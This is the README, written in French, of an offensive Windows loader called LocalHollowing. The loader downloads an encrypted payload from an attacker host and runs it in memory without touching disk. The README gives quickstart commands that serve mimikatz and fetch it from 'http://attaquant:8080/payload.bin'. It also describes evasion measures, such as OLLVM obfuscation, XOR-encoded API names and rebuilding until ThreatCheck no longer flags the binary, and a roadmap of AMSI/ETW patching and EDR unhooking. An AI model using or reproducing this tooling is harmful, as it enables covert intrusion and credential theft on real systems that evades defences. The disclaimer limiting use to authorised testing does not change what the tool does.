# LocalHollowing

Loader offensif basé sur la technique de **Local Hollowing** — remplace le contexte d'exécution du thread principal par un payload chiffré téléchargé en mémoire, sans créer de processus ni écrire sur disque.

> **Avertissement** : Usage exclusivement réservé à la recherche en sécurité et aux tests d'intrusion autorisés.

---

## Quickstart

```powershell
# Build + encryption en une commande
.\run.ps1 -PE C:\tools\mimikatz.exe -Pass "MaPassphrase"

# Servir le payload
python -m http.server 8080 --directory build

# Exécuter sur la cible
.\build\LocalHollowing.exe http://<IP>:8080/payload.bin "MaPassphrase"
```

Voir toutes les options : `.\run.ps1 -h`

---

## Comment ça marche

```
.\build\LocalHollowing.exe http://attaquant:8080/payload.bin "passphrase"
       │
       ├─ Thread secondaire créé
       │        │
       │        ├─ [1] Suspend le thread principal
       │        ├─ [2] Télécharge payload.bin (WinINet, PEB walk)
       │        ├─ [3] Déchiffre AES-256-CBC (clé = SHA256(passphrase))
       │        ├─ [4] Mappe le PE : headers, sections, relocations, IAT, delay imports
       │        ├─ [5] Enregistre les exception handlers (RtlAddFunctionTable)
       │        ├─ [6] Applique les protections mémoire par section
       │        ├─ [7] Spoof la command line (GetCommandLineW/A + PEB)
       │        └─ [8] Hijack RIP → entry point du payload, ResumeThread
       │
       └─ Le processus exécute le payload (fileless)
```

---

## Evasion statique

| Technique | Détail |
|---|---|
| Résolution d'API dynamique | PEB walk + export table — zéro import suspect dans l'IAT |
| Obfuscation des strings | Noms d'API/DLL XOR-encodés (clé aléatoire par build) |
| Chiffrement du payload | AES-256-CBC, clé dérivée d'une passphrase au runtime |
| OLLVM | BCF, FLA, SUB, SPLIT — paramètres randomisés à chaque build |
| ThreatCheck loop | Rebuild automatique jusqu'à validation (10 tentatives max) |
| Protections mémoire | RW → RX par section, jamais de RWX |
| Patch PE | Rich Header forgé, timestamp réaliste, section `.pad` basse entropie |
| Code légitime | utility.cpp = calculatrice, hash SHA-256, file info (couverture IAT) |

---

## Prérequis

- **Visual Studio 2022+** avec LLVM/OLLVM (`clang-cl.exe`, `lld-link.exe`)
- **Python 3** + `pycryptodome` : `pip install pycryptodome`
- **ThreatCheck** (optionnel) : [rasta-mouse/ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)

Chemins à vérifier dans `scripts/build.ps1` :
```powershell
$VCVARSALL = "C:\Program Files\Microsoft Visual Studio\...\vcvarsall.bat"
$OLLVM_BIN = "C:\Program Files\Microsoft Visual Studio\...\Llvm\x64\bin"
```

---

## Structure

```
local-hollowing/
├── run.ps1              # Point d'entrée unique (.\run.ps1 -h)
├── config.json          # API à résoudre dynamiquement
├── LocalHollowing/
│   ├── utility.cpp      # Entry point + code légitime (no obfuscation)
│   ├── loader.cpp       # Loader : download, decrypt, RunPE (OLLVM)
│   ├── loader.h
│   ├── peb_walk.h       # PEB walk + export table parser
│   └── resolve.h        # Auto-généré : résolution d'API XOR
├── scripts/
│   ├── build.ps1        # Compilation split (utility clean + loader OLLVM)
│   ├── encrypt_and_convert.py  # Chiffrement AES-256-CBC
│   ├── generate_resolve.py     # Génération resolve.h
│   └── patch_pe.py             # Post-build : Rich Header, timestamp, entropie
└── build/               # Sortie (généré par run.ps1)
    ├── LocalHollowing.exe
    ├── payload.bin
    └── passphrase.txt
```

---

## Options de run.ps1

| Paramètre | Description |
|---|---|
| `-PE` | Chemin vers le PE à chiffrer |
| `-Pass` | Passphrase AES-256 (identique au runtime) |
| `-NoObf` | Désactive OLLVM (build rapide, debug) |
| `-MaxAttempts` | Limite de retry ThreatCheck (défaut: 10) |
| `-ThreatCheck` | Chemin vers ThreatCheck.exe |
| `-h` | Affiche l'aide |

---

## Ajouter une API

Éditer `config.json` et relancer `.\run.ps1` :
```json
{
  "name": "NomDeLaFonction",
  "dll": "nom.dll",
  "return_type": "TYPE_RETOUR",
  "calling_convention": "WINAPI",
  "params": ["TYPE1", "TYPE2"]
}
```

---

## Roadmap

Actuellement seule l'évasion **statique** est implémentée. Reste à couvrir la détection **dynamique** (EDR/AV runtime) :

- [ ] **ETW Patching** — patcher `EtwEventWrite` pour couper la télémétrie kernel
- [ ] **AMSI Bypass** — patcher `AmsiScanBuffer` avant exécution du payload
- [ ] **Unhooking ntdll** — remapper une copie clean de ntdll depuis le disque pour virer les hooks EDR
- [ ] **Indirect Syscalls** — appels syscall directs pour bypass les hooks userland
- [ ] **Sleep Obfuscation** — chiffrer le PE en mémoire pendant les phases de sleep (Ekko/Foliage)
- [ ] **Module Stomping** — charger une DLL légitime et écraser son contenu au lieu de VirtualAlloc
- [ ] **Stack Spoofing** — falsifier la call stack pour paraître légitime aux scans de threads
- [ ] **Détection sandbox** — timing checks, vérification VM/debugger avant exécution
- [ ] **PPID Spoofing** — usurper le parent process ID pour paraître lancé par explorer.exe

---

## Limitations

- Payloads **.NET** non supportés (nécessite CLR hosting)
- **x64 uniquement**
- Payloads sans relocation table (`/FIXED`) peuvent échouer

---

## Licence

Recherche et éducation en sécurité offensive uniquement. **Usage réservé aux environnements autorisés.**
